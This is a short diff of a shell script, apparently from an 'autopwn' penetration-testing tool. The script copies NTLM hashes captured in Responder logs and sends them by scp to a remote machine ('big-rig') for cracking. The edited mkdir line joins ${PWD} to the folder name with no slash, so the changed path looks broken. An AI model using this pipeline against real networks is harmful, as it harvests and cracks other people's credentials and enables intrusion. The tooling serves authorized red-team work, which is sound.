@@ -5,8 +5,7 @@
 
 #Right now this doesn't keep track of which hashes are which - it copies ALL hashes, with no house cleaning./ we need to make sure it doesn't grow too big!
 
-
-mkdir autopwn_hashes
+mkdir ${PWD}autopwn_hashes
 cp /usr/share/responder/logs/SMB-NTLM*.txt ./autopwn_hashes/
 scp autopwn_hashes/* autopwn@big-rig:/home/dispareo/autopwn
 #Now that the file is copied over, crack it!
